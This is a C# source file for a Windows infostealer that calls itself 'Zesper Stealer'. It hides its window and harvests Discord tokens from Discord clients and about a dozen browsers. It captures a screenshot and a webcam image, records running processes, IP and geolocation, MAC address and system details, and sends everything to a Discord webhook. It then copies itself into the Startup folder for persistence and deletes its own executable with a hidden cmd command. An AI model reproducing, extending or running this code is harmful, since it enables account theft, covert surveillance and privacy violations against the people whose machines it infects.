using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Discord;
using Discord.Webhook;


namespace FooterTest
{
    static class Program
    {
        public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static List<string> goSendTokens = DiscordStealing.AllTokens;
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        /// <summary>
        /// Der Haupteinstiegspunkt für die Anwendung.
        /// </summary>
        /// 
        [STAThread]
        static async Task Main()
        {
          
            

            string outputFile = "processes.txt"; // Path and filename of the output text file

            // Get the list of running processes
            Process[] processes = Process.GetProcesses();

            // Create a StreamWriter to write to the output file
            using (StreamWriter writer = new StreamWriter(outputFile))
            {
                // Write process details to the file
                foreach (Process process in processes)
                {
                    writer.WriteLine("Name: {0}", process.ProcessName);
                    writer.WriteLine("ID: {0}", process.Id);
                    writer.WriteLine("Status: {0}", process.Responding ? "Running" : "Not Responding");
                    writer.WriteLine();
                }
            }
            WebcamScreenshot.Make();
            IntPtr hWnd = Process.GetCurrentProcess().MainWindowHandle;


            ShowWindow(hWnd, 0);

            Task.WaitAll(
      DiscordStealing.DiscordApp(),
      DiscordStealing.DiscordCanary(),
      DiscordStealing.DiscordPTB(),
      DiscordStealing.Chrome(),
      DiscordStealing.ChromeBeta(),
      DiscordStealing.FireFox(),
      DiscordStealing.Opera(),
      DiscordStealing.OperaGX(),
      DiscordStealing.Edge(),
      DiscordStealing.Yandex(),
      DiscordStealing.Brave(),
      DiscordStealing.EpicPrivacy(),
      DiscordStealing.Vivaldi(),
      DiscordStealing.ThreeHundredSixty(),
      DiscordStealing.CocCoc()
      );

            string currentFilePath = System.Reflection.Assembly.GetEntryAssembly().Location;
            string startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string destinationFilePath = Path.Combine(startupFolderPath, Path.GetFileName(currentFilePath));

            string Tokens = string.Join(Environment.NewLine, goSendTokens.ToList());

            string screenshot = "screenshot.png";
            string webcam = "Webcam.jpg";
            string processelist = "processes.txt";
            string Minecraft = $"{Environment.UserDomainName}-Minecraft.zip";
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                bmp.Save("screenshot.png");  // saves the image
            }
            #region IP, IPv6, Country, City.
            // WebClient
            WebClient Amogus = new WebClient();
            // DNS host name
            String host = System.Net.Dns.GetHostName();
            // IP
            string IP = Amogus.DownloadString("https://ipapi.co/ip/");
            // IPv6
            System.Net.IPAddress IPv6 = Dns.GetHostEntry(host).AddressList[0];
            // Country
            string Country = Amogus.DownloadString("https://ipapi.co/country_name/");
            // City
            string City = Amogus.DownloadString("https://ipapi.co/city/");
            #endregion
            var macAddress = NetworkInterface.GetAllNetworkInterfaces();
            var getTarget = macAddress[0].GetPhysicalAddress();
            string webhookUrl = "";
            string User = Environment.UserName;
            // Create the webhook client
            using (var client = new DiscordWebhookClient(webhookUrl))
            {
                // Create the embedded message
                var embed = new EmbedBuilder
                {
                    Title = $"{Environment.UserDomainName} - {IP}",
                    Color = Discord.Color.Blue,
                    Description = $"" +
                               "\n**===============  Log Info📝 ================\n**" +
                               "\n```Log date: " + Help.date + "```\n" +
                               "**===============  USR Info👤 ================\n**" +
                               "\n```UserName: " + User + "```" +
                               "\n```Machine Name: " + Environment.MachineName + "```" +
                               "\n```Active Window: " + SystemInfo.GetActiveWindowTitle() + "```" +
                               "\n```Launch: " + Help.ExploitName + "```\n" +
                               "**=============== OS Info💻 =================\n**" +
                               "\n```OS: " + SystemInfo.GetSystemVersion() + "```" +
                               "\n```Screen Metrics: " + SystemInfo.ScreenMetrics() + "```" +
                               "\n```CPU: " + SystemInfo.GetCPUName() + "```" +
                               "\n```GPU: " + SystemInfo.GetGpuName() + "```" +
                               "\n```RAM: " + SystemInfo.GetRAM() + "```" +
                               "\n```BSSID: " + BSSID.GetBSSID() + "```\n" +
                               "**=============== IPS Info🌐 ================\n**" +
                               "\n```IP: " + IP + "```" +
                               "\n```IPv6: " + IPv6 + "```" +
                               "\n```Country: " + Country + "```" +
                               "\n```City: " + City + "```" +
                               "\n```MAC Address: " + getTarget + "```\n" +
                               "**===============  MSG Info📧 ================\n**" +
                               "\n```Discord Tokens: " + "\n" + Tokens + "```\n" +
                               "**==============================**",

                    Footer = new EmbedFooterBuilder
                    {
                        Text = "Zesper Stealer by 0x",
                        IconUrl = "https://cdn.discordapp.com/attachments/1109242107736113235/1109243524186128384/Download.jpeg"
                    },
                   
                    
                };


                // Send the embedded message to the webhook
                await client.SendMessageAsync("||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here", false, embeds: new[] { embed.Build() },"Zesper" , "https://cdn.discordapp.com/attachments/1109242107736113235/1109243524186128384/Download.jpeg");
         
                
                
                await client.SendFileAsync(screenshot, "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here", false, null, "Zesper", "https://cdn.discordapp.com/attachments/1109242107736113235/1109243524186128384/Download.jpeg", null, true);
                await client.SendFileAsync(processelist, "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here", false, null, "Zesper", "https://cdn.discordapp.com/attachments/1109242107736113235/1109243524186128384/Download.jpeg", null, true);

                if (File.Exists("Webcam.jpg"))
                {
                    await client.SendFileAsync(webcam, "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here", false, null, "Zesper", "https://cdn.discordapp.com/attachments/1109242107736113235/1109243524186128384/Download.jpeg", null, true);
                }
                else
                {
                    await client.SendMessageAsync("**Webcam Not Found!**", false, null, "Zesper", "https://cdn.discordapp.com/attachments/1109242107736113235/1109243524186128384/Download.jpeg");
                }

                try
                {
                    File.Delete("Webcam.jpg");
                }
                catch
                {

                }

         

                File.Delete("screenshot.png");
            

                File.Delete(processelist);
                File.Copy(currentFilePath, destinationFilePath, true);

                if (File.Exists(AppData+"\\Windows.ran.txt"))
                {

                }
                else
                {
                    File.Create(AppData + "\\Windows.ran.txt");
                    string exePath = Process.GetCurrentProcess().MainModule.FileName;

                    // Create a new process to delete the file
                    Process.Start(new ProcessStartInfo
                    {
                        Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + exePath + "\"",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                        FileName = "cmd.exe"
                    });
                }
               
                Environment.Exit(0);
            }
        }
    }
}